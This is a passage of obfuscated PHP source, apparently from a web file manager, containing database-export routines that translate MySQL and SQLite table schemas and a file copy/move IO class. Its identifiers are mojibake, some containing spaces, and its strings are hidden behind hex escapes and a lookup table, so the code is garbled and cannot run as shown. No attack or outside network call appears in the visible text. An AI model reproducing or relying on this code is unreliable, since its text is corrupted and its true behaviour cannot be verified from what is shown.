$Áïª§Ûó->execute("\144\x72\157\x70\x20\x74\141\x62\x6c\x65\x20\x69\146\40\145\x78\151\x73\x74\x73\x20\140{$Œ»û¡è‰}\x60"); } } private function sqlEncode($“Ç«îµ) { $®âÔˆÄ =& $_SERVER[ì™ı‰º¯]; $ÌŸ¿¯ÃÜ = array(); foreach ($“Ç«îµ as $ï¨œŒÌå) { if (is_array($ï¨œŒÌå)) { $ï¨œŒÌå = json_encode_force($ï¨œŒÌå); } $ï¨œŒÌå = addslashes($ï¨œŒÌå); $ï¨œŒÌå = str_replace(array($®âÔˆÄ[1077], $®âÔˆÄ[231]), array($®âÔˆÄ[1078], $®âÔˆÄ[1079]), $ï¨œŒÌå); $ÌŸ¿¯ÃÜ[] = str_replace($®âÔˆÄ[58], $®âÔˆÄ[1080], $ï¨œŒÌå); } return $®âÔˆÄ[58] . implode($®âÔˆÄ[1081], $ÌŸ¿¯ÃÜ) . $®âÔˆÄ[58]; } private function sqlDecode($¸ÍÏîÊë, $Ï¹¯ÙÊÑ, $şíñ¸¬  = '') { $÷ØÓâ…Ï =& $_SERVER[ì™ı‰º¯]; $¸ÍÏîÊë = str_replace(array($÷ØÓâ…Ï[1078], $÷ØÓâ…Ï[1079]), array($÷ØÓâ…Ï[1077], $÷ØÓâ…Ï[231]), $¸ÍÏîÊë); if ($Ï¹¯ÙÊÑ == $÷ØÓâ…Ï[13]) { return $şíñ¸¬  != $÷ØÓâ…Ï[1082] ? stripslashes($¸ÍÏîÊë) : $¸ÍÏîÊë; } if ($şíñ¸¬  == $÷ØÓâ…Ï[1082]) { $¸ÍÏîÊë = str_replace($÷ØÓâ…Ï[1083], $÷ØÓâ…Ï[118], stripslashes($¸ÍÏîÊë)); } return $¸ÍÏîÊë; } public function getSqlFile($ü¦ƒÛ¹¶ = '') { $ş ê†“® =& $_SERVER[ì™ı‰º¯]; $ùğ ±œ = $this->dbType(!0); $×âøÆ˜½ = CONTROLLER_DIR . "\151\x6e\x73\x74\x61\154\x6c\57\x64\141\x74\141\57{$ùğ ±œ}\x2e\x73\x71\x6c"; $³ªÛ€¶Ü = file_get_contents($×âøÆ˜½); $¶ÇÚâ› = $ş ê†“®[1084] . ($ùğ ±œ == $ş ê†“®[800] ? $ş ê†“®[1085] : $ş ê†“®[1086]) . $ş ê†“®[1087]; preg_match_all($¶ÇÚâ›, $³ªÛ€¶Ü, $¹—‘ªÎÈ); $Ø’Õ¦ğÂ = $¹—‘ªÎÈ[1]; $Û¶§ü†œ = $this->model()->db(); $ÁÂÑÍ›Í = $Û¶§ü†œ->getTables(); $ÇÕµîö­ = TEMP_FILES . $ş ê†“®[1088] . date($ş ê†“®[746]) . $ş ê†“®[8]; del_dir($ÇÕµîö­); mk_dir($ÇÕµîö­); $Óù¹€ƒÎ = $ÇÕµîö­ . $ş ê†“®[1089]; $¯²˜Õ§ = $ÇÕµîö­ . $ş ê†“®[1090]; $¯ÆÂİóä = $ùğ ±œ == $ş ê†“®[13] ? $ş ê†“®[800] : $ş ê†“®[13]; IO::copy(CONTROLLER_DIR . "\x69\156\163\164\x61\x6c\154\x2f\x64\141\x74\x61\57{$¯ÆÂİóä}\x2e\x73\161\154", $ÇÕµîö­); @touch($ÇÕµîö­ . $ùğ ±œ . $ş ê†“®[784]); $Ô£øåûß = fopen($Óù¹€ƒÎ, $ş ê†“®[1065]); $Ï­á¯‹ = fopen($¯²˜Õ§, $ş ê†“®[1065]); if ($ùğ ±œ == $ş ê†“®[13]) { $ÁÂÑÍ›Í = array_diff($ÁÂÑÍ›Í, array($ş ê†“®[780], $ş ê†“®[781])); $ï‰…–Ï = array($ş ê†“®[1091], $ş ê†“®[1092], $ş ê†“®[1093]); fwrite($Ï­á¯‹, implode(PHP_EOL, $ï‰…–Ï) . PHP_EOL . PHP_EOL); foreach ($ÁÂÑÍ›Í as $éæÍ¢è´) { $ØáØù’ = $this->sqlFromSqlite($éæÍ¢è´); if (!$ØáØù’[$ş ê†“®[13]]) { continue; } fwrite($Ï­á¯‹, $ØáØù’[$ş ê†“®[13]] . PHP_EOL . PHP_EOL); if (!in_array($éæÍ¢è´, $Ø’Õ¦ğÂ)) { fwrite($Ô£øåûß, $ØáØù’[$ş ê†“®[800]] . PHP_EOL . PHP_EOL); } } } else { foreach ($ÁÂÑÍ›Í as $éæÍ¢è´) { $ØáØù’ = $this->sqlFromMysql($éæÍ¢è´); if (!$ØáØù’[$ş ê†“®[800]]) { continue; } fwrite($Ô£øåûß, $ØáØù’[$ş ê†“®[800]] . PHP_EOL . PHP_EOL); if (!in_array($éæÍ¢è´, $Ø’Õ¦ğÂ)) { fwrite($Ï­á¯‹, $ØáØù’[$ş ê†“®[13]] . PHP_EOL . PHP_EOL); } } } fclose($Ô£øåûß); fclose($Ï­á¯‹); $³ªÛ€¶Ü = array($ş ê†“®[800] => $Óù¹€ƒÎ, $ş ê†“®[13] => $¯²˜Õ§); return $ü¦ƒÛ¹¶ ? $³ªÛ€¶Ü[$ü¦ƒÛ¹¶] : $³ªÛ€¶Ü; } public function dbType($£ô¶ÄŸæ = false) { $¿Öã’„É =& $_SERVER[ì™ı‰º¯]; $½ş©õíí = $£ô¶ÄŸæ ? $GLOBALS[$¿Öã’„É[6]][$¿Öã’„É[21]] : $this->database; $½ş©õíí = array_change_key_case($½ş©õíí); $É¸ò¼Ş = $½ş©õíí[$¿Öã’„É[966]]; if ($É¸ò¼Ş == $¿Öã’„É[963]) { $ô±¸â = explode($¿Öã’„É[4], $½ş©õíí[$¿Öã’„É[972]]); $É¸ò¼Ş = $ô±¸â[0]; } $Ğ¢¯ÒÒ = array($¿Öã’„É[1094] => $¿Öã’„É[13], $¿Öã’„É[911] => $¿Öã’„É[800]); if (isset($Ğ¢¯ÒÒ[$É¸ò¼Ş])) { $É¸ò¼Ş = $Ğ¢¯ÒÒ[$É¸ò¼Ş]; } return $É¸ò¼Ş; } public function sqlFromMysql($âçÌá‘¡, $Á£´ñœ¼ = '') { $ ëøôòŞ =& $_SERVER[ì™ı‰º¯]; $•ÕÆˆ…½ = $this->model()->db(); $ıĞŒÑÆª = $•ÕÆˆ…½->query($ ëøôòŞ[1095] . $âçÌá‘¡ . $ ëøôòŞ[385]); if (!$ıĞŒÑÆª || !$ıĞŒÑÆª[0]) { return !1; } $éŠØƒ€ª = _get($ıĞŒÑÆª[0], $ ëøôòŞ[1096], $ ëøôòŞ[12]); if (!$éŠØƒ€ª) { return !1; } $–Ûà÷Ùİ = "\x44\x52\x4f\120\40\124\x41\102\x4c\x45\40\111\x46\x20\105\130\x49\x53\124\123\40\x60{$âçÌá‘¡}\140\x3b" . PHP_EOL . $éŠØƒ€ª . $ ëøôòŞ[71]; if ($Á£´ñœ¼ && $Á£´ñœ¼ == $ ëøôòŞ[800]) { return $–Ûà÷Ùİ; } $—şæÚÖà = array_change_key_case($GLOBALS[$ ëøôòŞ[6]][$ ëøôòŞ[21]]); $¾˜´şüÁ = $—şæÚÖà[$ ëøôòŞ[971]]; $“Ã¶İñÎ = $ ëøôòŞ[1097] . $¾˜´şüÁ . $ ëøôòŞ[1098] . $âçÌá‘¡ . $ ëøôòŞ[58]; $èªñÅÛ = $ ëøôòŞ[1099] . $âçÌá‘¡ . $ ëøôòŞ[899]; $³–§ŒÖ = $•ÕÆˆ…½->query($“Ã¶İñÎ); if (empty($³–§ŒÖ)) { $˜ó±Áá» = array($ ëøôòŞ[800] => $ ëøôòŞ[12], $ ëøôòŞ[13] => $ ëøôòŞ[12]); return $Á£´ñœ¼ ? $˜ó±Áá»[$Á£´ñœ¼] : $˜ó±Áá»; } $ÀºÎŠä¦ = $•ÕÆˆ…½->query($èªñÅÛ); $Ğ¥şÃƒÁ = $ ëøôòŞ[12]; $¤©©³û¥ = array(); foreach ($ÀºÎŠä¦ as $äãˆ²—ı) { if (!$Ğ¥şÃƒÁ && $äãˆ²—ı[$ ëøôòŞ[1100]] == $ ëøôòŞ[1101]) { $Ğ¥şÃƒÁ = $äãˆ²—ı[$ ëøôòŞ[1102]]; } if (isset($¤©©³û¥[$äãˆ²—ı[$ ëøôòŞ[1100]]])) { $¤©©³û¥[$äãˆ²—ı[$ ëøôòŞ[1100]]][$ ëøôòŞ[1103]][] = $äãˆ²—ı[$ ëøôòŞ[1102]]; continue; } $¤©©³û¥[$äãˆ²—ı[$ ëøôòŞ[1100]]] = array($ ëøôòŞ[1104] => $äãˆ²—ı[$ ëøôòŞ[1100]], $ ëøôòŞ[1103] => array($äãˆ²—ı[$ ëøôòŞ[1102]]), $ ëøôòŞ[1105] => $äãˆ²—ı[$ ëøôòŞ[1106]] == $ ëøôòŞ[88] ? 0 : 1); } $£¾„ğéÑ = array(); foreach ($¤©©³û¥ as $äãˆ²—ı) { $¢Ã£¡ = $äãˆ²—ı[$ ëøôòŞ[1104]] == $ ëøôòŞ[1101]; $óåÌ®‡ = array($ ëøôòŞ[1107], $äãˆ²—ı[$ ëøôòŞ[1105]] == $ ëøôòŞ[88] && !$¢Ã£¡ ? $ ëøôòŞ[1108] : $ ëøôòŞ[12], $ ëøôòŞ[1109], $ ëøôòŞ[1110] . $âçÌá‘¡ . $ ëøôòŞ[11] . ($¢Ã£¡ ? $ ëøôòŞ[1111] : $äãˆ²—ı[$ ëøôòŞ[1104]]) . $ ëøôòŞ[118], $ ëøôòŞ[1112], $ ëøôòŞ[118] . $âçÌá‘¡ . $ ëøôòŞ[118], $ ëøôòŞ[1113] . implode($ ëøôòŞ[1114], $äãˆ²—ı[$ ëøôòŞ[1103]]) . $ ëøôòŞ[1115]); $£¾„ğéÑ[] = implode($ ëøôòŞ[53], $óåÌ®‡) . $ ëøôòŞ[71]; } $Öº»Óä = array(); $­Êâ·Êæ = array($ ëøôòŞ[1116] => $ ëøôòŞ[1117], $ ëøôòŞ[1117] => $ ëøôòŞ[1117], $ ëøôòŞ[288] => $ ëøôòŞ[315], $ ëøôòŞ[287] => $ ëøôòŞ[315]); foreach ($³–§ŒÖ as $äãˆ²—ı) { $óåÌ®‡ = array($ ëøôòŞ[118] . $äãˆ²—ı[$ ëøôòŞ[1118]] . $ ëøôòŞ[118], isset($­Êâ·Êæ[$äãˆ²—ı[$ ëøôòŞ[1119]]]) ? $­Êâ·Êæ[$äãˆ²—ı[$ ëøôòŞ[1119]]] : $äãˆ²—ı[$ ëøôòŞ[1120]], $äãˆ²—ı[$ ëøôòŞ[1121]] == $ ëøôòŞ[897] ? $ ëøôòŞ[1122] : $ ëøôòŞ[1123], $äãˆ²—ı[$ ëøôòŞ[1118]] == $Ğ¥şÃƒÁ ? $ ëøôòŞ[1124] : $ ëøôòŞ[12], $äãˆ²—ı[$ ëøôòŞ[948]] ? strtoupper(str_replace($ ëøôòŞ[11], $ ëøôòŞ[12], $äãˆ²—ı[$ ëøôòŞ[948]])) : $ ëøôòŞ[12]); $Öº»Óä[] = trim(implode($ ëøôòŞ[53], $óåÌ®‡)); } $ æ“×éÈ = array($ ëøôòŞ[1125] . $âçÌá‘¡ . $ ëøôòŞ[1126], $ ëøôòŞ[1127] . $âçÌá‘¡ . $ ëøôòŞ[1128], implode($ ëøôòŞ[50] . PHP_EOL, $Öº»Óä), $ ëøôòŞ[945]); $‹À¾ìŒ = implode(PHP_EOL, array_merge($ æ“×éÈ, $£¾„ğéÑ)); if ($Á£´ñœ¼ && $Á£´ñœ¼ == $ ëøôòŞ[13]) { return $‹À¾ìŒ; } $˜ó±Áá» = array($ ëøôòŞ[800] => $–Ûà÷Ùİ, $ ëøôòŞ[13] => $‹À¾ìŒ); return $Á£´ñœ¼ ? $˜ó±Áá»[$Á£´ñœ¼] : $˜ó±Áá»; } public function sqlFromSqlite($Ø‚•, $‡¦éÄí = '') { $ªâÍ³¾ô =& $_SERVER[ì™ı‰º¯]; $×º–Ô¾Ø = $this->model()->db(); $°ÏÅÏª° = "\x50\x52\101\x47\x4d\101\x20\x54\101\102\x4c\x45\x5f\111\116\x46\x4f\x20\50\x27{$Ø‚•}\47\x29"; $Âñàå¦ş = "\123\x45\x4c\x45\x43\x54\x20\x2a\x20\106\122\x4f\115\40\x73\161\154\151\x74\145\x5f\155\x61\163\x74\145\x72\40\127\110\x45\x52\105\40\x74\142\154\x5f\156\141\155\145\x20\x3d\x20\47{$Ø‚•}\x27"; $ŸíÆ›µŒ = $×º–Ô¾Ø->query($°ÏÅÏª°); if (empty($ŸíÆ›µŒ)) { $ÃÇÇá…è = array($ªâÍ³¾ô[800] => $ªâÍ³¾ô[12], $ªâÍ³¾ô[13] => $ªâÍ³¾ô[12]); return $‡¦éÄí ? $ÃÇÇá…è[$‡¦éÄí] : $ÃÇÇá…è; } $­™ç„áÉ = $×º–Ô¾Ø->query($Âñàå¦ş); $ø¿¸¥Õ¤ = $§Ö ¸¨ = array(); foreach ($­™ç„áÉ as $ã”ñ ô®) { if ($ã”ñ ô®[$ªâÍ³¾ô[33]] == $ªâÍ³¾ô[279]) { $ø¿¸¥Õ¤[] = $ã”ñ ô®[$ªâÍ³¾ô[1129]]; } else { $§Ö ¸¨[$ã”ñ ô®[$ªâÍ³¾ô[32]]] = $ã”ñ ô®[$ªâÍ³¾ô[1129]]; } } $¥èñã¯ = array_merge(array($ªâÍ³¾ô[1125] . $Ø‚• . $ªâÍ³¾ô[118]), $ø¿¸¥Õ¤, array_values($§Ö ¸¨)); $¥èñã¯ = implode($ªâÍ³¾ô[71] . PHP_EOL, $¥èñã¯) . $ªâÍ³¾ô[71]; if ($‡¦éÄí && $‡¦éÄí == $ªâÍ³¾ô[13]) { return $¥èñã¯; } $»Èö÷¢Ã = array(); $Í±˜ö”¶ = array($ªâÍ³¾ô[1117] => $ªâÍ³¾ô[1130], $ªâÍ³¾ô[315] => $ªâÍ³¾ô[1131]); $‹‹”È¦ = $ªâÍ³¾ô[12]; foreach ($ŸíÆ›µŒ as $ã”ñ ô®) { if ($ã”ñ ô®[$ªâÍ³¾ô[57]] == $ªâÍ³¾ô[88]) { $‹‹”È¦ = $ã”ñ ô®[$ªâÍ³¾ô[32]]; } $ã•Ñ¢¢ë = array($ªâÍ³¾ô[385] . $ã”ñ ô®[$ªâÍ³¾ô[32]] . $ªâÍ³¾ô[385], isset($Í±˜ö”¶[$ã”ñ ô®[$ªâÍ³¾ô[33]]]) ? $Í±˜ö”¶[$ã”ñ ô®[$ªâÍ³¾ô[33]]] : $ã”ñ ô®[$ªâÍ³¾ô[33]], $ã”ñ ô®[$ªâÍ³¾ô[35]] == $ªâÍ³¾ô[88] ? $ªâÍ³¾ô[1122] : $ªâÍ³¾ô[1132] . $ã”ñ ô®[$ªâÍ³¾ô[56]], $ã”ñ ô®[$ªâÍ³¾ô[57]] == $ªâÍ³¾ô[88] ? $ªâÍ³¾ô[1133] : $ªâÍ³¾ô[12]); $»Èö÷¢Ã[] = trim(implode($ªâÍ³¾ô[53], $ã•Ñ¢¢ë)); } foreach ($§Ö ¸¨ as $€Ãµ°ğö => $ù½¢·Í) { $‘§ÈŞÔÀ = str_replace($ªâÍ³¾ô[1134] . $Ø‚• . $ªâÍ³¾ô[11], $ªâÍ³¾ô[12], $€Ãµ°ğö); $Ÿëôœ©ô = str_replace(array($ªâÍ³¾ô[118], $ªâÍ³¾ô[956]), $ªâÍ³¾ô[385], substr($ù½¢·Í, stripos($ù½¢·Í, $ªâÍ³¾ô[260]))); if ($‘§ÈŞÔÀ == $ªâÍ³¾ô[1111]) { $€¼†ÏÜÕ = $ªâÍ³¾ô[1135] . $‹‹”È¦ . $ªâÍ³¾ô[1136]; } else { $€¼†ÏÜÕ = (stripos($‘§ÈŞÔÀ, $ªâÍ³¾ô[11]) ? $ªâÍ³¾ô[1137] : $ªâÍ³¾ô[12]) . ($ªâÍ³¾ô[1138] . $‘§ÈŞÔÀ . $ªâÍ³¾ô[1139] . $Ÿëôœ©ô); } $»Èö÷¢Ã[] = $€¼†ÏÜÕ; } $¡Ÿ™­×Í = array($ªâÍ³¾ô[1140] . $Ø‚• . $ªâÍ³¾ô[1141], $ªâÍ³¾ô[1142] . $Ø‚• . $ªâÍ³¾ô[1143], implode($ªâÍ³¾ô[50] . PHP_EOL, $»Èö÷¢Ã), $ªâÍ³¾ô[1144]); $ôÆ²Ô°Ì = implode(PHP_EOL, $¡Ÿ™­×Í); if ($‡¦éÄí && $‡¦éÄí == $ªâÍ³¾ô[800]) { return $ôÆ²Ô°Ì; } $ÃÇÇá…è = array($ªâÍ³¾ô[800] => $ôÆ²Ô°Ì, $ªâÍ³¾ô[13] => $¥èñã¯); return $‡¦éÄí ? $ÃÇÇá…è[$‡¦éÄí] : $ÃÇÇá…è; } } class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($¢’«¤Ÿã, $Ş»ô’‘Û) { $®ü‹Ü¹  =& $_SERVER[ì™ı‰º¯]; $ÓèĞÜ¤ò = $Ş»ô’‘Û; $GLOBALS[$®ü‹Ü¹ [1145]] = $®ü‹Ü¹ [1146] . $¢’«¤Ÿã; Hook::trigger($®ü‹Ü¹ [1146] . $¢’«¤Ÿã . $®ü‹Ü¹ [1147], $ÓèĞÜ¤ò); $“ìâÅ—ô = self::driverMake($Ş»ô’‘Û[0]); if (!$“ìâÅ—ô) { return !1; } if (method_exists($“ìâÅ—ô, $¢’«¤Ÿã)) { $Ñ–—ñô = @call_user_func_array(array($“ìâÅ—ô, $¢’«¤Ÿã), $Ş»ô’‘Û); } else { if (method_exists($“ìâÅ—ô, $®ü‹Ü¹ [1148])) { $Ñ–—ñô = @call_user_func_array(array($“ìâÅ—ô, $¢’«¤Ÿã), $Ş»ô’‘Û); } else { if (method_exists(self, $¢’«¤Ÿã)) { $Ñ–—ñô = @call_user_func_array(array(self, $¢’«¤Ÿã), $Ş»ô’‘Û); } else { $Ñ–—ñô = call_user_func_array(array(parent, $¢’«¤Ÿã), $Ş»ô’‘Û); } } } Hook::trigger($®ü‹Ü¹ [1146] . $¢’«¤Ÿã . $®ü‹Ü¹ [1149], $ÓèĞÜ¤ò, $Ñ–—ñô); return $Ñ–—ñô; } public static function init($·›óƒ¾ì) { return self::driverMake($·›óƒ¾ì); } public static function copy($Ó“äğÕÈ, $Êêšâ—, $·ÏÃŞ‰¸ = false, $ÏÄÆ×À® = false) { return self::copyMoveStart($Ó“äğÕÈ, $Êêšâ—, $·ÏÃŞ‰¸, $_SERVER[ì™ı‰º¯][546], $ÏÄÆ×À®); } public static function move($¯¾Ë—Ã, $áº»¯ÜÈ, $¥™ıÀ = false, $ïÊ‰ù = false) { return self::copyMoveStart($¯¾Ë—Ã, $áº»¯ÜÈ, $¥™ıÀ, $_SERVER[ì™ı‰º¯][548], $ïÊ‰ù); } private static function copyMoveStart($¼êœ¡¯Ÿ, $Ú× «ÑÍ, $×í‡À¶, $‚à’ÖçÓ, $ÑËà²±ˆ) { $ÌîÂğ± =& $_SERVER[ì™ı‰º¯]; $êæÄ†¥â = array($¼êœ¡¯Ÿ, $Ú× «ÑÍ, $×í‡À¶, $ÑËà²±ˆ); Hook::trigger($ÌîÂğ±[1146] . $‚à’ÖçÓ . $ÌîÂğ±[1147], $êæÄ†¥â); $¤•õûõÖ = self::copyMove($¼êœ¡¯Ÿ, $Ú× «ÑÍ, $×í‡À¶, $‚à’ÖçÓ, $ÑËà²±ˆ); Hook::trigger($ÌîÂğ±[1146] . $‚à’ÖçÓ . $ÌîÂğ±[1149], $êæÄ†¥â, $¤•õûõÖ); return $¤•õûõÖ; } public static function saveFile($—¢…©¢Ó, $Íâ¹•áŒ, $°¦è†ç‘ = true) { $Û”‰¯à =& $_SERVER[ì™ı‰º¯]; $‡«Šº = self::info($Íâ¹•áŒ); $ÊŞõâ’‡ = self::driverMake($—¢…©¢Ó); $ë®ƒ‹ = self::driverMake($Íâ¹•áŒ); $¯Ñ’Æ—­ = !1; if ($ë®ƒ‹->pathParse[$Û”‰¯à[1150]]) { $¯Ñ’Æ—­ = $ë®ƒ‹; $Ø„¢Ã·Ë = $ë®ƒ‹->pathParse[$Û”‰¯à[1150]]; $ë®ƒ‹ = self::driverMake($Ø„¢Ã·Ë); } if ($ÊŞõâ’‡->pathParse[$Û”‰¯à[1150]]) { $µºõÕ²· = $ÊŞõâ’‡->pathParse[$Û”‰¯à[1150]]; $ÊŞõâ’‡ = self::driverMake($µºõÕ²·); } $ƒĞ°—Ì = $ë®ƒ‹->pathFather($Íâ¹•áŒ); $ÏôÕÚµœ = !0; if (!$°¦è†ç‘ && self::driverIsSame($ÊŞõâ’‡, $ë®ƒ‹)) { $ÏôÕÚµœ = !1; } $¥©Œº¥Ó = self::copyFile($ÊŞõâ’‡, $—¢…©¢Ó, $ë®ƒ‹, $ƒĞ°—Ì, $‡«Šº[$Û”‰¯à[32]], $ÏôÕÚµœ); if ($¯Ñ’Æ—­) { $¥©Œº¥Ó = $¯Ñ’Æ—­->getPathOuter($¥©Œº¥Ó); } return $¥©Œº¥Ó; } private static function copyMove($èúŒ¼·¶, $ê‡šÏëô, $ÙòÛ¬êÇ, $•ï°¨«, $ÏÈ‡Ò¥¨ = false) { $‚›Åá™ş =& $_SERVER[ì™ı‰º¯]; if (!$èúŒ¼·¶ || $èúŒ¼·¶ == $‚›Åá™ş[8] || !$ê‡šÏëô) { return !1; } ignore_timeout(); $¥ì¦Ó™È = self::driverMake($èúŒ¼·¶); $¡ƒÓîãù = self::driverMake($ê‡šÏëô); $Àè»ÉÌÉ = $•ï°¨« == $‚›Åá™ş[548]; $£“´•Õ¯ = !1; if ($¡ƒÓîãù->pathParse[$‚›Åá™ş[1150]]) { $£“´•Õ¯ = $¡ƒÓîãù; $ê‡šÏëô = $¡ƒÓîãù->pathParse[$‚›Åá™ş[1150]]; $¡ƒÓîãù = self::driverMake($ê‡šÏëô); } if ($¥ì¦Ó™È->pathParse[$‚›Åá™ş[1150]]) { $èúŒ¼·¶ = $¥ì¦Ó™È->pathParse[$‚›Åá™ş[1150]]; $¥ì¦Ó™È = self::driverMake($èúŒ¼·¶); } self::check($¥ì¦Ó™È, $èúŒ¼·¶, $¡ƒÓîãù, $ê‡šÏëô); Hook::trigger($‚›Åá™ş[1151], $¥ì¦Ó™È, $èúŒ¼·¶, $¡ƒÓîãù, $ê‡šÏëô); $ âá¿ß = self::driverIsSame($¥ì¦Ó™È, $¡ƒÓîãù); if ($ âá¿ß) { if ($•ï°¨« == $‚›Åá™ş[548] && !method_exists($¡ƒÓîãù, $‚›Åá™ş[1152]) && trim($ê‡šÏëô, $‚›Åá™ş[8]) == trim($¡ƒÓîãù->pathFather($èúŒ¼·¶), $‚›Åá™ş[8])) { if ($¥ì¦Ó™È->pathThis($èúŒ¼·¶) != $ÏÈ‡Ò¥¨ && !$¥ì¦Ó™È->isTypeObject()) { return $¥ì¦Ó™È->rename($èúŒ¼·¶, $ÏÈ‡Ò¥¨); } return $¡ƒÓîãù->getPathOuter($èúŒ¼·¶); } if (method_exists($¡ƒÓîãù, $•ï°¨«)) { return $¡ƒÓîãù->{$•ï°¨«}($èúŒ¼·¶, $ê‡šÏëô, $ÙòÛ¬êÇ, $ÏÈ‡Ò¥¨); } } if ($ âá¿ß && $•ï°¨« == $‚›Åá™ş[548] && $¡ƒÓîãù->getType() == $‚›Åá™ş[106]) { $İã‘ÛÉµ = $¡ƒÓîãù->movePath($èúŒ¼·¶, $ê‡šÏëô, $ÏÈ‡Ò¥¨); if ($İã‘ÛÉµ) { return $İã‘ÛÉµ; } } $ÜÌ•–¾À = $¥ì¦Ó™È->isFile($èúŒ¼·¶); if (!$ÜÌ•–¾À && $¡ƒÓîãù->getType() == $‚›Åá™ş[753] && $¥ì¦Ó™È->getType() == $‚›Åá™ş[106]) { $İã‘ÛÉµ = $¡ƒÓîãù->copyFolderFromIO($¥ì¦Ó™È, $èúŒ¼·¶, $ê‡šÏëô, $ÙòÛ¬êÇ, $Àè»ÉÌÉ, $ÏÈ‡Ò¥¨); } else { $İã‘ÛÉµ = self::copyPath($¥ì¦Ó™È, $èúŒ¼·¶, $¡ƒÓîãù, $ê‡šÏëô, $ÙòÛ¬êÇ, $Àè»ÉÌÉ, $ÜÌ•–¾À, $ÏÈ‡Ò¥¨); } if ($İã‘ÛÉµ && $Àè»ÉÌÉ) { $¥ì¦Ó™È->remove($èúŒ¼·¶); } if ($£“´•Õ¯) { $İã‘ÛÉµ = $£“´•Õ¯->getPathOuter($İã‘ÛÉµ); } return $İã‘ÛÉµ; } private static function check($ñë’îŞè, $Ç–òºû¿, $² ïó„è, &$ıÆ†¯’) { $Ú€½±ºÉ =& $_SERVER[ì™ı‰º¯]; if (self::driverIsSame($ñë’îŞè, $² ïó„è) && $ñë’îŞè->isFolder($Ç–òºû¿) && $ñë’îŞè->isParentOf($Ç–òºû¿, $ıÆ†¯’)) { show_json(LNG($Ú€½±ºÉ[1153]), !1); } if (!$ñë’îŞè->exist($Ç–òºû¿)) { show_json(LNG($Ú€½±ºÉ[105]), !1); } } private static function copyPath($Úç¹áŒš, $¯ß­ÄÂœ, $Ê»§´ù, $†¤€Š†, $Œ™€  Î, $˜Ÿ†úÏ, $ÒÈ í½¸, $«›âçÒ = false, $–Øöáíœ = true) { $Ç‰‰ÇÏè =& $_SERVER[ì™ı‰º¯]; $›èãî°© = empty($«›âçÒ) && $«›âçÒ !== $Ç‰‰ÇÏè[198] ? $Úç¹áŒš->pathThis($¯ß­ÄÂœ) : $«›âçÒ; if ($Œ™€  Î) { $ì›ˆé—´ = $Ê»§´ù->fileNameExist($†¤€Š†, $›èãî°©); $íÓÖº£î = $›èãî°©; $›èãî°© = $Ê»§´ù->fileNameAuto($†¤€Š†, $›èãî°©, $Œ™€  Î, !$ÒÈ í½¸); if (!$ì›ˆé—´ || $íÓÖº£î != $›èãî°©) { $Œ™€  Î = !1; } if ($–Øöáíœ && !$Œ™€  Î) { $Ê»§´ù->_data[$Ç‰‰ÇÏè[1154]] = !0; } } if ($ÒÈ í½¸) { return self::copyFile($Úç¹áŒš, $¯ß­ÄÂœ, $Ê»§´ù, $†¤€Š†, $›èãî°©, $˜Ÿ†úÏ); } if ($Œ™€  Î == REPEAT_RENAME_FOLDER) { $Œ™€  Î = !1; } $Ä„½¨Û = rtrim($†¤€Š†, $Ç‰‰ÇÏè[8]) . $Ç‰‰ÇÏè[8] . $›èãî°©; $ã‰Ç›Ú¢ = $Ê»§´ù->mkdir($Ê»§´ù->getPath($Ä„½¨Û), $Œ™€  Î); $†¤€Š† = $Ê»§´ù->getPathInner($ã‰Ç›Ú¢); $Ÿ†éğêÉ = $Úç¹áŒš->listPath($¯ß­ÄÂœ, !0); $Ÿ†éğêÉ = is_array($Ÿ†éğêÉ) ? $Ÿ†éğêÉ : array($Ç‰‰ÇÏè[83] => array(), $Ç‰‰ÇÏè[82] => array()); $¯œ–ĞÄ = array_merge($Ÿ†éğêÉ[$Ç‰‰ÇÏè[83]], $Ÿ†éğêÉ[$Ç‰‰ÇÏè[82]]); foreach ($¯œ–ĞÄ as $ü›‡ÙòÁ) { $òÔÊÑ¶İ = $ü›‡ÙòÁ[$Ç‰‰ÇÏè[33]] == $Ç‰‰ÇÏè[200]; $¯ß­ÄÂœ = $Úç¹áŒš->getPathInner($ü›‡ÙòÁ[$Ç‰‰ÇÏè[84]]); $‰îÂ¶œ = self::copyPath($Úç¹áŒš, $¯ß­ÄÂœ, $Ê»§´ù, $†¤€Š†, $Œ™€  Î, $˜Ÿ†úÏ, $òÔÊÑ¶İ, !1, !1); if (!$‰îÂ¶œ) { IO::errorTips($Ç‰‰ÇÏè[1155] . $¯ß­ÄÂœ . $Ç‰‰ÇÏè[70] . $†¤€Š†); } } self::copyMoveKeepInfo($Úç¹áŒš, $¯ß­ÄÂœ, $ã‰Ç›Ú¢); return $ã‰Ç›Ú¢; } private static function copyFile($üï¨šãÄ, $¾ÜÄîÉ§, $Çäˆñê, $õ«İİØÏ, $ºÖäœ™à, $îŠ¹³’­) { $ıçÕ™ÕŠ =& $_SERVER[ì™ı‰º¯]; $õ«İİØÏ = $Çäˆñê->getPath(rtrim($õ«İİØÏ, $ıçÕ™ÕŠ[8]) . $ıçÕ™ÕŠ[8] . $ºÖäœ™à); $–ÎõÒ¸ğ = $ıçÕ™ÕŠ[1156] . time() . rand_string(5); Hook::trigger($ıçÕ™ÕŠ[1157], $üï¨šãÄ, $¾ÜÄîÉ§, $Çäˆñê, $õ«İİØÏ, $ºÖäœ™à, $–ÎõÒ¸ğ); if (self::driverIsSame($üï¨šãÄ, $Çäˆñê)) { if ($îŠ¹³’­) { $’ø–ÁøÜ = $Çäˆñê->moveFile($¾ÜÄîÉ§, $õ«İİØÏ); } else { $’ø–ÁøÜ = $Çäˆñê->copyFile($¾ÜÄîÉ§, $õ«İİØÏ); } Hook::trigger($ıçÕ™ÕŠ[1158], $üï¨šãÄ, $¾ÜÄîÉ§, $Çäˆñê, $õ«İİØÏ, $ºÖäœ™à, $’ø–ÁøÜ); self::copyMoveKeepInfo($üï¨šãÄ, $¾ÜÄîÉ§, $’ø–ÁøÜ); return $’ø–ÁøÜ; } $ã¤ì­­ù = TEMP_FILES; if ($GLOBALS[$ıçÕ™ÕŠ[6]][$ıçÕ™ÕŠ[89]][$ıçÕ™ÕŠ[792]]) { $ã¤ì­­ù = $GLOBALS[$ıçÕ™ÕŠ[6]][$ıçÕ™ÕŠ[89]][$ıçÕ™ÕŠ[792]]; } $‘Ğ‹üšŠ = $ã¤ì­­ù; mk_dir($‘Ğ‹üšŠ); $ªŸú¬Ïä = $‘Ğ‹üšŠ . $–ÎõÒ¸ğ; $Éã¼‰ÔÇ = $ªŸú¬Ïä; $ªŸú¬Ïä = $üï¨šãÄ->download($¾ÜÄîÉ§, $ªŸú¬Ïä); 